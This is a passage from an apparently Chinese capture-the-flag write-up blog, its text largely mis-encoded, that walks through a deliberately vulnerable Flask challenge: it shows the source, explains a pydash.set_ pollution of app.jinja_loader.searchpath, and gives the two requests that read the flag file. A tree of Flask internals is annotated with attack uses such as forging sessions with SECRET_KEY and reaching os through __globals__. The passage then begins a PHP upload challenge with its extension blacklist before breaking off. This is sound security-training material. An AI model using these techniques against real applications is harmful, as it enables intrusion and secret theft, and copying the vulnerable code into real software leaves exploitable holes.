class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template,redirect,url_for</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line">database=&#123;&#125;</span><br><span class="line">data_index=<span class="number">0</span></span><br><span class="line">name=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/registerV2&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">registerV2</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    password2=request.form[<span class="string">&#x27;password2&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> password!=password2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;å‰åå¯†ç ä¸ä¸€è‡´ï¼Œè¯·ç¡®è®¤åé‡æ–°è¾“å…¥ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/register&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> data_index</span><br><span class="line">        data_index+=<span class="number">1</span></span><br><span class="line">        database[data_index]=username</span><br><span class="line">        database[username]=password</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user_dashboard&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_dashboard</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/272e1739b89da32e983970ece1a086bd&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A272e1739b89da32e983970ece1a086bd</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/operate&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    username=request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password=request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    confirm_password=request.args.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">and</span> <span class="string">&quot;old&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password:</span><br><span class="line">        Username=<span class="built_in">globals</span>()[username]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pydash.set_(Username,password,confirm_password)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate success&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/name&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;username&#x27;</span>:user&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reset&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>():</span><br><span class="line">    old_password=request.form[<span class="string">&#x27;old_password&#x27;</span>]</span><br><span class="line">    new_password=request.form[<span class="string">&#x27;new_password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">in</span> database <span class="keyword">and</span> database[user] == old_password:</span><br><span class="line">        database[user]=new_password</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;å¯†ç ä¿®æ”¹æˆåŠŸï¼Œè¯·é‡æ–°ç™»å½•ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;å¯†ç ä¿®æ”¹å¤±è´¥ï¼Œè¯·ç¡®è®¤æ—§å¯†ç æ˜¯å¦æ­£ç¡®ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/user_dashboard&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/impression&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">impression</span>():</span><br><span class="line">    point=request.args.get(<span class="string">&#x27;point&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(point) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="type">List</span>=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> point:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(point)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="built_in">type</span>=request.form[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> database <span class="keyword">and</span> database[username] != password:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯è¯·é‡æ–°è¾“å…¥ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> username <span class="keyword">not</span> <span class="keyword">in</span> database:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯è¯·é‡æ–°è¾“å…¥ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> name</span><br><span class="line">        name=username    </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">type</span>)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;user_dashboard&#x27;</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(<span class="built_in">type</span>)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;A272e1739b89da32e983970ece1a086bd&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8080</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªjsæ–‡ä»¶å’Œä¸€ä¸ªpyæ–‡ä»¶ï¼Œ<del>è°æ›´é‡è¦å¥½éš¾çŒœå•Š</del>ï¼Œç€é‡åˆ†æä¸€ä¸‹main.py</p>
<p>é¦–å…ˆæ˜¯æœ€æ˜æ˜¾çš„ä¸€ä¸ªä¹‹å‰æ²¡å‡ºç°è¿‡çš„è·¯ç”±&#x2F;operate</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/operate&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    username=request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password=request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    confirm_password=request.args.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">and</span> <span class="string">&quot;old&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password:</span><br><span class="line">        Username=<span class="built_in">globals</span>()[username]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pydash.set_(Username,password,confirm_password)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate success&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span> </span><br></pre></td></tr></table></figure>

<ul>
<li><p>è¿™ä¸€éƒ¨åˆ†å­˜åœ¨ä¸‰ä¸ªå¯æ§GETå‚æ•°usernameã€passwordã€confirm_password</p>
</li>
<li><p>åŒæ—¶å‡ºç°äº†æœ€å…³é”®çš„è¯­å¥<strong>pydash.set_(Username,password,confirm_password)</strong>ï¼Œè¿™é‡Œæ˜ç¡®äº†å¦‚ä½•åˆ©ç”¨è¿™ä¸‰ä¸ªå‚æ•°è¿›è¡Œæ±¡æŸ“</p>
<ul>
<li><code>pydash.set_</code> å‡½æ•°çš„è¯­æ³•æ˜¯ï¼š <code>pydash.set_(å¯¹è±¡, å±æ€§è·¯å¾„, æ–°å€¼)</code></li>
</ul>
</li>
</ul>
<p>æ¥ç€æ˜¯å¦ä¸€ä¸ªä¹Ÿæ²¡æœ‰å‡ºç°è¿‡çš„è·¯ç”±&#x2F;impression</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/impression&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">impression</span>():</span><br><span class="line">    point=request.args.get(<span class="string">&#x27;point&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(point) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="type">List</span>=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> point:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(point)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ç»™äº†æ–°GETå‚æ•°pointï¼Œå¹¶ä¸”é™åˆ¶äº†åªèƒ½äº”ä¸ªå­—ç¬¦ï¼Œé‚£flagæ–‡ä»¶å¤§æ¦‚å°±å«flagäº†</p>
</li>
<li><p>ç»™å‡ºäº†é»‘åå•ï¼Œå…¶ä¸­è¿‡æ»¤äº†<code>{</code>, <code>}</code>, <code>%</code>, <code>_</code>å°æ€ SSTIï¼Œè¿‡æ»¤äº†<code>.</code> (ç‚¹)å°æ€è·¯å¾„ç©¿è¶Šå’Œç‰¹å®šæ–‡ä»¶è¯»å–ï¼Œè¿‡æ»¤äº†<code>&lt;</code>, <code>&gt;</code>å°æ€ XSSï¼Œåªèƒ½ç”¨é…ç½®æ±¡æŸ“</p>
</li>
<li><p>æœ€å<strong>è¿”å›äº†render_template(point)</strong>ï¼Œè¿™å°±æ˜¯èƒ½æ¸²æŸ“å‡ºflagæ–‡ä»¶å†…å®¹çš„å…³é”®</p>
</li>
</ul>
<p>é¦–å…ˆæ ¹æ®æ ‘çŠ¶å›¾ç¡®å®šï¼š</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">app (Flask åº”ç”¨å®ä¾‹)</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ .config  (é…ç½®å­—å…¸)</span><br><span class="line">â”‚   â”‚   # è¿™é‡Œå­˜æ”¾ç€æ‰€æœ‰çš„å®‰å…¨é…ç½®</span><br><span class="line">â”‚   â”œâ”€â”€ [&#x27;SECRET<span class="emphasis">_KEY&#x27;]               -&gt; Session ç­¾åå¯†é’¥ (æ‹¿åˆ°å®ƒå°±èƒ½ä¼ªé€ ä»»æ„ç”¨æˆ·ç™»å½•)</span></span><br><span class="line"><span class="emphasis">â”‚   â”œâ”€â”€ [&#x27;SQLALCHEMY_</span>DATABASE<span class="emphasis">_URI&#x27;]  -&gt; æ•°æ®åº“è¿æ¥ä¸² (æ”¹æˆä½ çš„æ¶æ„æ•°æ®åº“åœ°å€)</span></span><br><span class="line"><span class="emphasis">â”‚   â”œâ”€â”€ [&#x27;DEBUG&#x27;]                    -&gt; è°ƒè¯•æ¨¡å¼å¼€å…³ (éƒ¨åˆ†ç‰ˆæœ¬å¼€å¯å¯å¯¼è‡´ RCE)</span></span><br><span class="line"><span class="emphasis">â”‚   â”œâ”€â”€ [&#x27;PERMANENT_</span>SESSION<span class="emphasis">_LIFETIME&#x27;]-&gt; Session è¿‡æœŸæ—¶é—´</span></span><br><span class="line"><span class="emphasis">â”‚   â””â”€â”€ ... (å…¶ä»–è‡ªå®šä¹‰é…ç½®)</span></span><br><span class="line"><span class="emphasis">â”‚</span></span><br><span class="line"><span class="emphasis">â”œâ”€â”€ .jinja_</span>loader (æœ¬é¢˜æ”»å‡»åŒºï¼šæ¨¡æ¿åŠ è½½å™¨)</span><br><span class="line">â”‚   â”‚   # è´Ÿè´£å¯»æ‰¾æ¨¡æ¿æ–‡ä»¶</span><br><span class="line">â”‚   â””â”€â”€ .searchpath (list)           -&gt; [å…³é”®] æ¨¡æ¿æœç´¢è·¯å¾„åˆ—è¡¨</span><br><span class="line">â”‚       â”‚                               (é»˜è®¤æ˜¯ [&#x27;/app/templates&#x27;])</span><br><span class="line">â”‚       â””â”€â”€ æ”¹ä¸º [&#x27;/&#x27;] åˆ™å¯¼è‡´ LFI</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ .jinja<span class="emphasis">_env (Jinja2 ç¯å¢ƒé…ç½®)</span></span><br><span class="line"><span class="emphasis">â”‚   â”‚   # è¿™é‡Œæ§åˆ¶ç€æ¨¡æ¿æ¸²æŸ“çš„è§„åˆ™</span></span><br><span class="line"><span class="emphasis">â”‚   â”œâ”€â”€ .globals (dict)              -&gt; å…¨å±€å‡½æ•°/å˜é‡ (SSTI å¸¸åœ¨è¿™é‡Œæ‰¾ os/eval)</span></span><br><span class="line"><span class="emphasis">â”‚   â”œâ”€â”€ .filters (dict)              -&gt; è¿‡æ»¤å™¨å®šä¹‰</span></span><br><span class="line"><span class="emphasis">â”‚   â””â”€â”€ ...</span></span><br><span class="line"><span class="emphasis">â”‚</span></span><br><span class="line"><span class="emphasis">â”œâ”€â”€ .url_</span>map (è·¯ç”±æ˜ å°„è¡¨)</span><br><span class="line">â”‚   â”‚   # å†³å®šäº† URL æ€ä¹ˆè·³è½¬</span><br><span class="line">â”‚   â””â”€â”€ ...</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ .view<span class="emphasis">_functions (è§†å›¾å‡½æ•°å­—å…¸)</span></span><br><span class="line"><span class="emphasis">â”‚   â”‚   # å­˜å‚¨äº†æ¯ä¸ªè·¯ç”±å¯¹åº”çš„ Python å‡½æ•°</span></span><br><span class="line"><span class="emphasis">â”‚   â””â”€â”€ ...</span></span><br><span class="line"><span class="emphasis">â”‚</span></span><br><span class="line"><span class="emphasis">â””â”€â”€ .<span class="strong">__class__</span> / .<span class="strong">__init__</span> (Python åŸç”Ÿé­”æ³•å±æ€§)</span></span><br><span class="line"><span class="emphasis">    â”‚   # ç”¨æ¥è¿›è¡Œâ€œåŸå‹é“¾â€è·³è·ƒï¼Œè·³å‡º app å»æ‰¾å…¶ä»–æ¨¡å—</span></span><br><span class="line"><span class="emphasis">    â””â”€â”€ .<span class="strong">__globals__</span>                 -&gt; è®¿é—®å¼•å…¥çš„ os, sys ç­‰æ¨¡å— (RCE å¸¸ç”¨)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>æ”»å‡»å¯¹è±¡ï¼šappï¼ˆFlaské»˜è®¤ï¼‰</p>
</li>
<li><p>å±æ€§è·¯å¾„ï¼šapp.jinja_loader.searchpathæˆ–è€…jinja_loader.searchpath</p>
</li>
<li><p>æ–°å€¼ï¼š&#x2F;ï¼ˆå¤§æ¦‚ç‡è¢«æ”¾ç½®åœ¨ç³»ç»Ÿæ ¹ç›®å½•ï¼‰</p>
</li>
</ul>
<p>æ„é€ å¹¶è®¿é—®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/operate?username=app&amp;password=jinja_loader.searchpath&amp;confirm_password=/</span><br></pre></td></tr></table></figure>

<p>æ˜¾ç¤ºoprate successï¼Œè¯æ˜æ±¡æŸ“æˆåŠŸ</p>
<p>æ¥ç€æ„é€ å¹¶è®¿é—®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/impression?point=flag</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°flag</p>
<hr>
<h1 id="9-mv-upload"><a href="#9-mv-upload" class="headerlink" title="9. mv_upload"></a>9. mv_upload</h1><p>è¿™ç§ä¸Šä¼ æ–‡ä»¶çš„é¢˜ç›®ï¼Œé¦–å…ˆåœ¨ä¿¡æ¯ä¸è¶³çš„æƒ…å†µä¸‹å…ˆæŸ¥çœ‹ç‰ˆæœ¬å’Œæ‰«ç›®å½•</p>
<p>ç”¨dirsearchæ‰«å‡ºäº†&#x2F;index.php~ï¼Œè®¿é—®åæ‹¿åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uploadDir</span> = <span class="string">&#x27;/tmp/upload/&#x27;</span>; <span class="comment">// ä¸´æ—¶ç›®å½•</span></span><br><span class="line"><span class="variable">$targetDir</span> = <span class="string">&#x27;/var/www/html/upload/&#x27;</span>; <span class="comment">// å­˜å‚¨ç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$blacklist</span> = [</span><br><span class="line">    <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;php7&#x27;</span>, <span class="string">&#x27;phps&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>,<span class="string">&#x27;jsp&#x27;</span>, <span class="string">&#x27;jspa&#x27;</span>, <span class="string">&#x27;jspx&#x27;</span>, <span class="string">&#x27;jsw&#x27;</span>, <span class="string">&#x27;jsv&#x27;</span>, <span class="string">&#x27;jspf&#x27;</span>, <span class="string">&#x27;jtml&#x27;</span>,<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;aspx&#x27;</span>, <span class="string">&#x27;ascx&#x27;</span>, <span class="string">&#x27;ashx&#x27;</span>, <span class="string">&#x27;asmx&#x27;</span>, <span class="string">&#x27;cer&#x27;</span>, <span class="string">&#x27;aSp&#x27;</span>, <span class="string">&#x27;aSpx&#x27;</span>, <span class="string">&#x27;cEr&#x27;</span>, <span class="string">&#x27;pHp&#x27;</span>,<span class="string">&#x27;shtml&#x27;</span>, <span class="string">&#x27;shtm&#x27;</span>, <span class="string">&#x27;stm&#x27;</span>,<span class="string">&#x27;pl&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;exe&#x27;</span>, <span class="string">&#x27;bat&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;py&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>, <span class="string">&#x27;scgi&#x27;</span>,<span class="string">&#x27;htaccess&#x27;</span>, <span class="string">&#x27;htpasswd&#x27;</span>, <span class="string">&quot;php2&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;htm&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>,  <span class="string">&quot;swf&quot;</span>,<span class="string">&quot;ini&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$filesInTmp</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºç›®æ ‡ç›®å½•</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$targetDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$targetDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸Šä¼ 